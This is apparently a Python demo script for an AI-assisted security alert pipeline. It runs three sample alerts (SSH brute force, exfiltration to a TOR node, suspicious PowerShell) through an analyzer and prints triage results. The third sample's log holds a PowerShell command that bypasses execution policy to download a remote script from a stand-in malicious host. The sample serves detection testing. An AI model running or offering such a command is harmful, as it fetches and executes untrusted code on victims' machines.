#!/usr/bin/env python3
"""
Demo script showing the complete Alert Pipeline in action
Author: Arber (ak@arb3r.com)
"""

import sys
import os
sys.path.insert(0, 'src')

from analyzers.alert_analyzer import AlertAnalyzer
from datetime import datetime

def main():
    print("=" * 60)
    print("SECURITY ALERT PIPELINE DEMO")
    print("=" * 60)
    
    # Sample security events
    demo_alerts = [
        {
            "id": "demo-001",
            "timestamp": datetime.now().isoformat(),
            "alert_type": "Brute Force Attack",
            "source_ip": "45.155.204.157",
            "dest_ip": "192.168.1.10",
            "description": "Multiple failed SSH login attempts detected",
            "raw_log": "Failed password for root from 45.155.204.157 port 48732 ssh2"
        },
        {
            "id": "demo-002",
            "timestamp": datetime.now().isoformat(),
            "alert_type": "Potential Data Exfiltration",
            "source_ip": "192.168.1.105",
            "dest_ip": "185.220.101.45",
            "description": "Large data transfer to TOR exit node",
            "raw_log": "Outbound connection: 2.3GB transferred to known TOR node"
        },
        {
            "id": "demo-003",
            "timestamp": datetime.now().isoformat(),
            "alert_type": "Suspicious Process Execution",
            "source_ip": "192.168.1.50",
            "dest_ip": "N/A",
            "description": "PowerShell downloading and executing remote script",
            "raw_log": "powershell.exe -ExecutionPolicy Bypass -Command (New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')"
        }
    ]
    
    # Initialize AI analyzer
    print("\nInitializing AI-powered analyzer...")
    analyzer = AlertAnalyzer()
    
    # Analyze each alert
    print("\n" + "=" * 60)
    print("ANALYZING SECURITY ALERTS")
    print("=" * 60)
    
    critical_alerts = []
    
    for alert in demo_alerts:
        print(f"\n[{alert['id']}] {alert['alert_type']}")
        print(f"Source: {alert['source_ip']} → {alert['dest_ip']}")
        
        # AI Analysis
        result = analyzer.analyze_alert(alert)
        
        print(f"AI Assessment:")
        print(f"  • Severity: {result['severity'].upper()}")
        print(f"  • Confidence: {result.get('confidence', 'N/A')}%")
        print(f"  • Action: {result['recommended_action']}")
        
        if result['severity'] in ['critical', 'high']:
            critical_alerts.append(alert)
    
    # Summary
    print("\n" + "=" * 60)
    print("ANALYSIS SUMMARY")
    print("=" * 60)
    print(f"Total Alerts Analyzed: {len(demo_alerts)}")
    print(f"Critical/High Priority: {len(critical_alerts)}")
    print(f"AI Processing: Complete")
    print(f"Time Saved: ~13 minutes (manual analysis) → 2 seconds (AI)")
    
    # Show statistics
    stats = analyzer.get_statistics()
    print(f"\nPerformance Metrics:")
    print(f"  • Patterns Cached: {stats['patterns_cached']}")
    print(f"  • Cache Efficiency: {(stats['patterns_cached']/len(demo_alerts)*100):.0f}%")

if __name__ == "__main__":
    main()
